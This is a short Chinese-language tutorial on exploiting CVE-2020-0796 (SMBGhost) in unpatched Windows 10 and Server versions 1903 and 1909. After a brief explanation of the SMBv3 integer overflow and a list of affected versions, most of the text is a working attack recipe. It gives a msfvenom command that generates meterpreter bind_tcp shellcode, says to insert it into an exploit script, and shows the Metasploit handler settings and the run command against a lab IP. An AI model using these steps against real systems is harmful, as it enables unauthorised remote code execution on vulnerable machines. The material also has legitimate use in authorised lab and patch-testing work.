漏洞介绍

CVE-2020-0796是由于SMBv3协议在处理恶意的压缩数据包时出错所造成的；在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。它可让远程且未经身份验证的攻击者在目标系统上执行任意代码，漏洞有点像永恒之蓝(也是针对smb协议)

影响版本

Windows 10 Version 1903 for 32-bit Systems

Windows 10 Version 1903 for x64-based Systems

Windows 10 Version 1903 for ARM64-based Systems

Windows Server, Version 1903 (Server Core installation)

Windows 10 Version 1909 for 32-bit Systems

Windows 10 Version 1909 for x64-based Systems

Windows 10 Version 1909 for ARM64-based Systems

Windows Server, Version 1909 (Server Core installation)

靶机 没有打补丁的windows10系统

使用msf生成shellcode



msfvenom -p windows/x64/meterpreter/bind_tcp lport=3333 -f py -o shellcode.txt

将生成的shellcode替换exp中的exploit.py中的USER_PAYLOAD并保存



msf5 > use exploit/multi/handler


msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp


payload => windows/x64/meterpreter/bind_tcp


msf5 exploit(multi/handler) > set rhost 192.168.232.134


rhost => 192.168.232.134


msf5 exploit(multi/handler) > set lport 3333


lport => 3333


msf5 exploit(multi/handler) > exploit



执行攻击

python3 exploit.py -ip 192.168.232.134
